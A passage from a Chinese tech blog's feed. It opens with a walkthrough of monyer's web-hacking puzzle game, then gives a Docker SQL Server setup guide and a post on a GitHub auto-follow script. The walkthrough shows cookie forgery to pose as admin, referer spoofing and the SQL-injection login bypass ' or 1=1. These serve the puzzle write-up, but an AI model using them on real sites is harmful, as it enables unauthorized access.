class="number">101</span>,<span class="number">61</span>,<span class="number">61</span>,<span class="number">97</span>,<span class="number">41</span>,<span class="number">123</span>,<span class="number">13</span>,<span class="number">10</span>,<span class="number">09</span>,<span class="number">09</span>,<span class="number">119</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">100</span>,<span class="number">111</span>,<span class="number">119</span>,<span class="number">46</span>,<span class="number">108</span>,<span class="number">111</span>,<span class="number">99</span>,<span class="number">97</span>,<span class="number">116</span>,<span class="number">105</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">46</span>,<span class="number">104</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">102</span>,<span class="number">61</span>,<span class="number">97</span>,<span class="number">43</span>,<span class="number">34</span>,<span class="number">46</span>,<span class="number">112</span>,<span class="number">104</span>,<span class="number">112</span>,<span class="number">34</span>,<span class="number">59</span>,<span class="number">13</span>,<span class="number">10</span>,<span class="number">09</span>,<span class="number">125</span>,<span class="number">101</span>,<span class="number">108</span>,<span class="number">115</span>,<span class="number">101</span>,<span class="number">123</span>,<span class="number">13</span>,<span class="number">10</span>,<span class="number">09</span>,<span class="number">09</span>,<span class="number">97</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">34</span>,<span class="number">23494</span>,<span class="number">30721</span>,<span class="number">38169</span>,<span class="number">35823</span>,<span class="number">34</span>,<span class="number">41</span>,<span class="number">59</span>,<span class="number">13</span>,<span class="number">10</span>,<span class="number">09</span>,<span class="number">125</span>,<span class="number">13</span>,<span class="number">10</span>,<span class="number">125</span>));</div><div class="line"><span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></div></pre></td></tr></table></figure>
<p>新时代无须解释，直接上chrome consle<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">String</span>.fromCharCode(<span class="number">102</span>,<span class="number">117</span>,<span class="number">110</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">105</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">32</span>,<span class="number">99</span>,<span class="number">104</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">107</span>,<span class="number">40</span>,<span class="number">41</span>,<span class="number">123</span>,<span class="number">13</span>,<span class="number">10</span>,<span class="number">09</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">32</span>,<span class="number">97</span>,<span class="number">32</span>,<span class="number">61</span>,<span class="number">32</span>,<span class="number">39</span>,<span class="number">100</span>,<span class="number">52</span>,<span class="number">103</span>,<span class="number">39</span>,<span class="number">59</span>,<span class="number">13</span>,<span class="number">10</span>,<span class="number">09</span>,<span class="number">105</span>,<span class="number">102</span>,<span class="number">40</span>,<span class="number">100</span>,<span class="number">111</span>,<span class="number">99</span>,<span class="number">117</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">46</span>,<span class="number">103</span>,<span class="number">101</span>,<span class="number">116</span>,<span class="number">69</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">66</span>,<span class="number">121</span>,<span class="number">73</span>,<span class="number">100</span>,<span class="number">40</span>,<span class="number">39</span>,<span class="number">116</span>,<span class="number">120</span>,<span class="number">116</span>,<span class="number">39</span>,<span class="number">41</span>,<span class="number">46</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">108</span>,<span class="number">117</span>,<span class="number">101</span>,<span class="number">61</span>,<span class="number">61</span>,<span class="number">97</span>,<span class="number">41</span>,<span class="number">123</span>,<span class="number">13</span>,<span class="number">10</span>,<span class="number">09</span>,<span class="number">09</span>,<span class="number">119</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">100</span>,<span class="number">111</span>,<span class="number">119</span>,<span class="number">46</span>,<span class="number">108</span>,<span class="number">111</span>,<span class="number">99</span>,<span class="number">97</span>,<span class="number">116</span>,<span class="number">105</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">46</span>,<span class="number">104</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">102</span>,<span class="number">61</span>,<span class="number">97</span>,<span class="number">43</span>,<span class="number">34</span>,<span class="number">46</span>,<span class="number">112</span>,<span class="number">104</span>,<span class="number">112</span>,<span class="number">34</span>,<span class="number">59</span>,<span class="number">13</span>,<span class="number">10</span>,<span class="number">09</span>,<span class="number">125</span>,<span class="number">101</span>,<span class="number">108</span>,<span class="number">115</span>,<span class="number">101</span>,<span class="number">123</span>,<span class="number">13</span>,<span class="number">10</span>,<span class="number">09</span>,<span class="number">09</span>,<span class="number">97</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">34</span>,<span class="number">23494</span>,<span class="number">30721</span>,<span class="number">38169</span>,<span class="number">35823</span>,<span class="number">34</span>,<span class="number">41</span>,<span class="number">59</span>,<span class="number">13</span>,<span class="number">10</span>,<span class="number">09</span>,<span class="number">125</span>,<span class="number">13</span>,<span class="number">10</span>,<span class="number">125</span>)</div></pre></td></tr></table></figure></p>
<p>输出为<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</div><div class="line">	<span class="keyword">var</span> a = <span class="string">'d4g'</span>;</div><div class="line">	<span class="keyword">if</span>(<span class="built_in">document</span>.getElementById(<span class="string">'txt'</span>).value==a)&#123;</div><div class="line">		<span class="built_in">window</span>.location.href=a+<span class="string">".php"</span>;</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">		alert(<span class="string">"密码错误"</span>);</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>好了我们知道了，密码是d4g，下一关！</p>
<h1 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h1><p><a href="http://monyer.com/game/game1/d4g.php" target="_blank" rel="external">http://monyer.com/game/game1/d4g.php</a></p>
<p>这一关非常猥琐，页面会自动跳转，稍有不注意，就跳走了。<br>打开后立即按esc停止。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;script type=<span class="string">"text/rocketscript"</span> data-rocketoptimized=<span class="string">"true"</span>&gt;</div><div class="line">    <span class="built_in">eval</span>(<span class="function"><span class="keyword">function</span>(<span class="params">p,a,c,k,e,d</span>)</span>&#123;e=<span class="function"><span class="keyword">function</span>(<span class="params">c</span>)</span>&#123;<span class="keyword">return</span> c.toString(<span class="number">36</span>)&#125;;<span class="keyword">if</span>(!<span class="string">''</span>.replace(<span class="regexp">/^/</span>,<span class="built_in">String</span>))&#123;<span class="keyword">while</span>(c--)d[c.toString(a)]=k[c]||c.toString(a);k=[<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">return</span> d[e]&#125;];e=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span><span class="string">'\\w+'</span>&#125;;c=<span class="number">1</span>&#125;;<span class="keyword">while</span>(c--)<span class="keyword">if</span>(k[c])p=p.replace(<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">'\\b'</span>+e(c)+<span class="string">'\\b'</span>,<span class="string">'g'</span>),k[c]);<span class="keyword">return</span> p&#125;(<span class="string">'a="e";d c()&#123;b(9.8(\'7\').6==a)&#123;5.4.3=a+".2"&#125;1&#123;0("密码错误")&#125;&#125;'</span>,<span class="number">15</span>,<span class="number">15</span>,<span class="string">'alert|else|php|href|location|window|value|txt|getElementById|document||if|check|function|3bhe'</span>.split(<span class="string">'|'</span>),<span class="number">0</span>,&#123;&#125;))</div><div class="line">&lt;<span class="regexp">/script&gt;</span></div></pre></td></tr></table></figure>
<p>显然这是一个加密的js，我们需要解密，上解密工具：</p>
<p><a href="http://tool.lu/js/" target="_blank" rel="external">http://tool.lu/js/</a></p>
<p>解密后：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">a = <span class="string">"3bhe"</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>) </span>&#123;</div><div class="line">	<span class="keyword">if</span> (<span class="built_in">document</span>.getElementById(<span class="string">'txt'</span>).value == a) &#123;</div><div class="line">		<span class="built_in">window</span>.location.href = a + <span class="string">".php"</span></div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		alert(<span class="string">"密码错误"</span>)</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>密码是 3bhe 下一关</p>
<p>诶？怎么不对？仔细检查源代码发现下面还有一行<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">eval</span>(<span class="string">"\141\75\141\56\164\157\125\160\160\145\162\103\141\163\145\50\51\53\61\73"</span>);</div></pre></td></tr></table></figure></p>
<p>解密！<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">a = a.toUpperCase() + <span class="number">1</span>;</div></pre></td></tr></table></figure></p>
<p>.toUpperCase()是转换大写，所以密码是 3BHE1 下一关 go</p>
<h1 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h1><p><a href="http://monyer.com/game/game1/3BHE1.php" target="_blank" rel="external">http://monyer.com/game/game1/3BHE1.php</a></p>
<blockquote>
<p>密码在哪儿？额，我藏在页面里了哦！</p>
</blockquote>
<p>这题的难点在于 找到不密码藏在哪里了 搜索了个遍 就是找不到密码 看看http头呢？</p>
<p>找到了，在cookie里</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">monyer:the password for the next level is asdf</div></pre></td></tr></table></figure>
<p>下一关！</p>
<h1 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h1><p><a href="http://monyer.com/game/game1/asdf.php" target="_blank" rel="external">http://monyer.com/game/game1/asdf.php</a></p>
<p>是个线索题目</p>
<p>Get the latest fashion, beauty, dating, and health tips. Plus, win freebies, take quizzes, and check your daily horoscope! Girl Games - 9000+ Free Games for Girls …</p>
<p>真蛋疼<br>把这个线索在网上一搜 第一个已经是一个结题方案了，看来monyer的游戏已经成功干过一个网站了。</p>
<p>这个答案是；seventeen</p>
<h1 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h1><p><a href="http://monyer.com/game/game1/seventeen7.php" target="_blank" rel="external">http://monyer.com/game/game1/seventeen7.php</a></p>
<p>社工题</p>
<p>先解密md5吧</p>
<p>5e023995fb3f5e840ee684784f8f0799</p>
<p><a href="http://www.somd5.com/" target="_blank" rel="external">http://www.somd5.com/</a></p>
<p>解密出  eighteen8</p>
<p>下一关</p>
<h1 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h1><p><a href="http://monyer.com/game/game1/eighteen8.php" target="_blank" rel="external">http://monyer.com/game/game1/eighteen8.php</a></p>
<p>直接看到 一个404 不要着急 审查工具</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;p style=&quot;display:none&quot;&gt;</div><div class="line">第8关</div><div class="line">朋友您好，第8关欢迎您！</div><div class="line">我对您的聪明才智感到惊讶！</div><div class="line">相信我，现在世界上85%以上的人都在你之下，</div><div class="line">所以你可以大步向前，义无反顾地进行你的事业了。</div><div class="line">因为只要你肯努力，不畏惧挫折，这个世界上没有难倒你的事。</div><div class="line">那么继续我们的约定，我将告诉你第9关的入口：</div><div class="line">10000以内所有质数和.php</div><div class="line">&lt;/p&gt;</div></pre></td></tr></table></figure>
<p>10000以内所有质数和，so easy！写个javascript 算一下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">var sum = 0;</div><div class="line">for (var i = 2; i &lt; 10000; i++) &#123;</div><div class="line">	var flag = true;</div><div class="line">	for (var j = 2; j &lt;= Math.sqrt(i); j++) &#123;</div><div class="line">		if (i % j == 0) flag = false ;</div><div class="line">	&#125;</div><div class="line">    if(flag) &#123;sum = sum + i;&#125;</div><div class="line">&#125;</div><div class="line">console.log(sum);</div><div class="line"></div><div class="line">5736396</div></pre></td></tr></table></figure>
<p>下一关</p>
<h1 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h1><p><a href="http://monyer.com/game/game1/5736396.php" target="_blank" rel="external">http://monyer.com/game/game1/5736396.php</a></p>
<p>在命令行里输入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">wget http://monyer.com/game/game1/img/4681851790659554.jpg</div><div class="line">cat 4681851790659554.jpg</div></pre></td></tr></table></figure></p>
<p>密码藏在图片里<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">���^�v��*&#123;I�z��^�iؾSRW�V�6�Z��(����H�����ٹ�����</div><div class="line">�Ǿ���ʽ�ʲô���ţ�</div><div class="line">�ԣ�������������������......��</div><div class="line">��ϲ�㣡</div><div class="line">��ʮ������Ϊ��MonyerLikeYou_the10level</div><div class="line">�����ڿ�ʼ�漰������Ķ�̬���������㶼���԰���ʾ������ɵģ�</div><div class="line">�����Լ���û��ģ�%</div></pre></td></tr></table></figure></p>
<p>MonyerLikeYou_the10level</p>
<h1 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h1><p><a href="http://monyer.com/game/game1/MonyerLikeYou_the10level.php" target="_blank" rel="external">http://monyer.com/game/game1/MonyerLikeYou_the10level.php</a></p>
<blockquote>
<p>当前用户身份为simpleuser 不是admin，无法显示下一关密码</p>
</blockquote>
<p>很显然这是一道session/cookie欺骗题</p>
<p>在console里直接输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">document.cookie=&quot;username=admin&quot;</div></pre></td></tr></table></figure></p>
<p>刷新</p>
<blockquote>
<p>好聪明哦！下一关密码为：doyouknow</p>
</blockquote>
<p>下一关！</p>
<h1 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关"></a>第十一关</h1><p><a href="http://monyer.com/game/game1/doyouknow.php?action=show_login_false" target="_blank" rel="external">http://monyer.com/game/game1/doyouknow.php?action=show_login_false</a></p>
<blockquote>
<p>你的session不是passer，不能查看下一关密码</p>
</blockquote>
<p>在console里直接输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">document.cookie=&quot;username=passer&quot;</div></pre></td></tr></table></figure></p>
<p>刷新，好像不对哦，monyer骗我，哼！</p>
<p>再看标题 action=show_login_false </p>
<p><a href="http://monyer.com/game/game1/doyouknow.php?action=show_login_true" target="_blank" rel="external">http://monyer.com/game/game1/doyouknow.php?action=show_login_true</a></p>
<blockquote>
<p>您的session为passer，所以您可以查看下一关密码：smartboy</p>
</blockquote>
<p>下一关！</p>
<h1 id="第十二关"><a href="#第十二关" class="headerlink" title="第十二关"></a>第十二关</h1><p><a href="http://monyer.com/game/game1/smartboy.php" target="_blank" rel="external">http://monyer.com/game/game1/smartboy.php</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">JTRBJTU0JTYzJTdBJTRBJTU0JTVBJTQ3JTRBJTU0JTU5JTc5JTRBJTU0JTU5JTMxJTRBJTU0JTU5JTc4JTRBJTU0JTYzJTMxJTRBJTU0JTYzJTMwJTRBJTU0JTU5JTM1JTRBJTU0JTU5JTMyJTRBJTU0JTYzJTMxJTRBJTU0JTVBJTQ0JTRBJTU0JTRBJTQ2JTRBJTU0JTYzJTc3JTRBJTU0JTU5JTM0JTRBJTU0JTYzJTc3</div></pre></td></tr></table></figure>
<p>直觉告诉我，这显然是Base64 解密<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">%4A%54%63%7A%4A%54%5A%47%4A%54%59%79%4A%54%59%31%4A%54%59%78%4A%54%63%31%4A%54%63%30%4A%54%59%35%4A%54%59%32%4A%54%63%31%4A%54%5A%44%4A%54%4A%46%4A%54%63%77%4A%54%59%34%4A%54%63%77</div></pre></td></tr></table></figure></p>
<p>直觉告诉我，这显然是 UrlEncode 解密</p>
<p>JTczJTZGJTYyJTY1JTYxJTc1JTc0JTY5JTY2JTc1JTZDJTJFJTcwJTY4JTcw</p>
<p>直觉再次告诉我，这显然是 Base64 解密</p>
<p>%73%6F%62%65%61%75%74%69%66%75%6C%2E%70%68%70</p>
<p>直觉再次告诉我，这显然是  UrlEncode 解密</p>
<p>sobeautiful.php</p>
<p>不错 密码就是sobeautiful</p>
<h1 id="第十三关"><a href="#第十三关" class="headerlink" title="第十三关"></a>第十三关</h1><p><a href="http://monyer.com/game/game1/sobeautiful.php" target="_blank" rel="external">http://monyer.com/game/game1/sobeautiful.php</a></p>
<blockquote>
<p>本页禁止盗链！</p>
</blockquote>
<p>wtf..显然他判断了http来源，需要伪造http referer，那么我们在之前的第十二关的审查代码中加入：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>= <span class="string">"http://monyer.com/game/game1/sobeautiful.php"</span>&gt;</span> 简便伪造referer<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div></pre></td></tr></table></figure>
<blockquote>
<p>欢迎您来到第13关</p>
<p>请输入密码进入第14关：</p>
<p>没有输入密码 或 密码错误 或 系统错误！</p>
</blockquote>
<p>看源代码有post提交</p>
<p>这是一道SQL 注入题</p>
<p>试试我大万能密码！<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos; or 1=1</div></pre></td></tr></table></figure></p>
<p>万能密码熟记于心</p>
<blockquote>
<p>下一关密码：whatyouneverknow</p>
</blockquote>
<p>下一关！</p>
<h1 id="第十四关"><a href="#第十四关" class="headerlink" title="第十四关"></a>第十四关</h1><p><a href="http://monyer.com/game/game1/whatyouneverknow.php" target="_blank" rel="external">http://monyer.com/game/game1/whatyouneverknow.php</a></p>
<p>感谢@Echowxsy提供第14关解密过程</p>
<p><img src="/content/images/monyerhack/01.jpg" alt=""></p>
<p><img src="/content/images/monyerhack/02.jpg" alt=""></p>
<p><img src="/content/images/monyerhack/03.jpg" alt=""></p>
<p><img src="/content/images/monyerhack/1.jpg" alt=""></p>
<p><img src="/content/images/monyerhack/2.jpg" alt=""></p>
<p><img src="/content/images/monyerhack/3.jpg" alt=""></p>
<p><img src="/content/images/monyerhack/5.jpg" alt=""></p>
<h1 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关"></a>第十五关</h1><p><img src="/content/images/monyerhack/4.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;之前混百度空间混久了，认识很多大牛，不乏monyer大牛。很早很早以前，他做了一个黑客小游戏，当时还不太会玩，现在突然打开发现，网站竟然还活着，决定重温经典。&lt;/p&gt;
    
    </summary>
    
      <category term="Hack" scheme="http://blog.yfgeek.com/categories/Hack/"/>
    
    
      <category term="Hack" scheme="http://blog.yfgeek.com/tags/Hack/"/>
    
  </entry>
  
  <entry>
    <title>Docker下配置SQL Server for Linux</title>
    <link href="http://blog.yfgeek.com/2016/11/22/docker-SQLServer/"/>
    <id>http://blog.yfgeek.com/2016/11/22/docker-SQLServer/</id>
    <published>2016-11-22T14:44:06.000Z</published>
    <updated>2016-12-22T01:16:52.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>微软已经不再是以前的那个微软了，如果微软SQL Server早开源几年，估计现在数据库方面就没有Oracle什么事情了。</p>
<p>Canonical 技术主管 Dustin Kirkland 表示：「微软和 Canonical 继续在 Windows 世界和 Linux 世界之间建立桥梁。 SQL Server on Ubuntu 便是这种趋势的又一示例。」</p>
<a id="more"></a>
<p><img src="/content/images/sqldocker/micosoft.png" alt=""></p>
<h1 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h1><ul>
<li>Docker版本在 1.8 以上</li>
<li>至少 4GB 硬盘空间</li>
<li>至少 4GB 内存</li>
</ul>
<p><img src="/content/images/sqldocker/0.jpg" alt=""></p>
<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><h2 id="拉取docker镜像"><a href="#拉取docker镜像" class="headerlink" title="拉取docker镜像"></a>拉取docker镜像</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker pull microsoft/mssql-server-linux</div></pre></td></tr></table></figure>
<h2 id="运行docker镜像"><a href="#运行docker镜像" class="headerlink" title="运行docker镜像"></a>运行docker镜像</h2><p><code>YourStrong!Passw0rd</code> 为你的密码</p>
<p><code>1433</code> 为对外端口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker run -e &apos;ACCEPT_EULA=Y&apos; -e &apos;SA_PASSWORD=&lt;YourStrong!Passw0rd&gt;&apos; -p 1433:1433 -d microsoft/mssql-server-linux</div></pre></td></tr></table></figure></p>
<p>🌰 例子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker run -e &apos;ACCEPT_EULA=Y&apos; -e &apos;SA_PASSWORD=&lt;YourStrong!Passw0rd&gt;&apos; -p 1433:1433 -d microsoft/mssql-server-linux</div></pre></td></tr></table></figure></p>
<h2 id="设置-宿主机保存数据目录-暂不支持"><a href="#设置-宿主机保存数据目录-暂不支持" class="headerlink" title="设置 宿主机保存数据目录(暂不支持)"></a>设置 宿主机保存数据目录(暂不支持)</h2><p><code>&lt;host directory&gt;</code> 为目录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker run -e &apos;ACCEPT_EULA=Y&apos; -e &apos;SA_PASSWORD=&lt;YourStrong!Passw0rd&gt;&apos; -p 1433:1433 -v &lt;host directory&gt;:/var/opt/mssql -d microsoft/mssql-server-linux</div></pre></td></tr></table></figure>
<h2 id="查看容器的ip-调试用"><a href="#查看容器的ip-调试用" class="headerlink" title="查看容器的ip(调试用)"></a>查看容器的ip(调试用)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker inspect --format=&apos;&#123;&#123;.NetworkSettings.IPAddress&#125;&#125;&apos; 容器id</div></pre></td></tr></table></figure>
<p>172.17.0.2</p>
<h1 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h1><p>用户名是SA</p>
<p>密码是用户自己设置的</p>
<p><img src="/content/images/sqldocker/1.jpg" alt=""></p>
<p>连接成功！</p>
<p><img src="/content/images/sqldocker/2.jpg" alt=""></p>
<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>内存占用情况</p>
<p><img src="/content/images/sqldocker/3.jpg" alt=""></p>
<p>我们一起默念<strong> 微软大法好 </strong> <strong> 微软大法好 </strong> <strong> 微软大法好 </strong> 。</p>
<p>谢谢微软为开源世界做的一切！</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://docs.microsoft.com/zh-cn/sql/linux/sql-server-linux-setup-docker" target="_blank" rel="external">https://docs.microsoft.com/zh-cn/sql/linux/sql-server-linux-setup-docker</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;微软已经不再是以前的那个微软了，如果微软SQL Server早开源几年，估计现在数据库方面就没有Oracle什么事情了。&lt;/p&gt;
&lt;p&gt;Canonical 技术主管 Dustin Kirkland 表示：「微软和 Canonical 继续在 Windows 世界和 Linux 世界之间建立桥梁。 SQL Server on Ubuntu 便是这种趋势的又一示例。」&lt;/p&gt;
    
    </summary>
    
      <category term="Docker" scheme="http://blog.yfgeek.com/categories/Docker/"/>
    
    
      <category term="Docker" scheme="http://blog.yfgeek.com/tags/Docker/"/>
    
      <category term="SQLserver" scheme="http://blog.yfgeek.com/tags/SQLserver/"/>
    
  </entry>
  
  <entry>
    <title>当我关注3万Github用户后发生了什么</title>
    <link href="http://blog.yfgeek.com/2016/11/19/github3k/"/>
    <id>http://blog.yfgeek.com/2016/11/19/github3k/</id>
    <published>2016-11-19T11:36:26.000Z</published>
    <updated>2016-12-27T03:50:14.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>16天前，写了一个小python程序，自动关注Github里的人，python真是尤物，能快速麻出想做的程序。</p>
<p>于是乎我利用这个关注了3万人的Github，可是关注后<del>除了同性交友</del>似乎没有什么用，而我发现一件事，就是我的首页动态变化如同刷新浪微博一样，每个人都在star或fork各种项目，不乏很多精品资源。<br><a id="more"></a><br><img src="/content/images/githubauto/1.jpg" alt=""></p>
<p>翻都翻不过来，那么同时还存在一些“无用( <del>垃圾</del> )项目”，star和fork数量很少，点开没有意义。那么能否写一个python小程序，把“高质量”的项目来源于好友follow的项目都爬出来呢？</p>
<p>经过短暂的编码，<code>GithubAwesome.py</code>诞生了。</p>
<p>现在进入<a href="https://github.com/yfgeek/AutoGithub" target="_blank" rel="external">AutoGithub</a>项目就可以看到GithubAwesome.py项目</p>
<h1 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h1><p>设置一个规则，如果关注的人的动态里刷出来的项目 star数量 大于 最少 star  或 大于 最少 fork，那么就把他输出出来。</p>
<p>举个🌰<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">最少 star 数: 50</div><div class="line">最少 fork 数: 50</div></pre></td></tr></table></figure></p>
<p>效果如图</p>
<p><img src="/content/images/githubauto/awesomesnap.png" alt=""></p>
<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>首先，确保你安装了<code>beautifulsoup4</code>.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip install beautifulsoup4</div></pre></td></tr></table></figure>
<p>然后编辑<code>GithubAwesome.py</code>文件，请原谅如此土的方式。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">ga = GithubAwesome(<span class="string">'username'</span>,<span class="string">'password'</span>)</div><div class="line"><span class="comment"># login</span></div><div class="line">ga.login()</div><div class="line">ga.get_awesome(<span class="number">1</span>,<span class="number">20</span>,<span class="number">50</span>) <span class="comment"># 第一页 规则 min star 20 min or fork 20</span></div></pre></td></tr></table></figure></p>
<h1 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h1><p>当你关注超过1K的用户，你会感叹，每天都有精品项目推送的感觉，真好！😁</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;16天前，写了一个小python程序，自动关注Github里的人，python真是尤物，能快速麻出想做的程序。&lt;/p&gt;
&lt;p&gt;于是乎我利用这个关注了3万人的Github，可是关注后&lt;del&gt;除了同性交友&lt;/del&gt;似乎没有什么用，而我发现一件事，就是我的首页动态变化如同刷新浪微博一样，每个人都在star或fork各种项目，不乏很多精品资源。&lt;br&gt;
    
    </summary>
    
      <category term="Github" scheme="http://blog.yfgeek.com/categories/Github/"/>
    
    
      <category term="Github" scheme="http://blog.yfgeek.com/tags/Github/"/>
    
  </entry>
  
  <entry>
    <title>树莓派实时温度湿度监测 优化后续</title>
    <link href="http://blog.yfgeek.com/2016/11/17/opt-rpi-project/"/>
    <id>http://blog.yfgeek.com/2016/11/17/opt-rpi-project/</id>
    <published>2016-11-17T23:46:21.000Z</published>
    <updated>2016-11-19T12:08:40.000Z</updated>
    
